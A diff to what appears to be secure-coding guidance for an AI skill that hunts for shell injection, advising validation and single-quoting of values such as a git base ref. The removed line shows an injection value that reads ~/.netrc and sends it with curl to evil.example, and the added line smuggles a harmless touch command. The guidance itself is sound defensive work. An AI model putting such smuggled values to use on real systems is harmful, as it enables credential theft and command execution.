@@ -326,7 +326,7 @@ shell command — never paste it raw. Examples:
 - `rg --no-heading -e '<term>'` (or pass via `-f -` from stdin to avoid the
   shell entirely)
 
-A `<base>` value of `main; cat ~/.netrc | curl -d @- evil.example;#` reaching
+A `<base>` value of `main; touch /tmp/pwned;#` reaching
 the shell would otherwise execute the appended commands. Validation rejects it;
 single-quoting makes the rejection unnecessary as a second line of defense.
 Apply both. A skill that hunts for injection must not contain one.
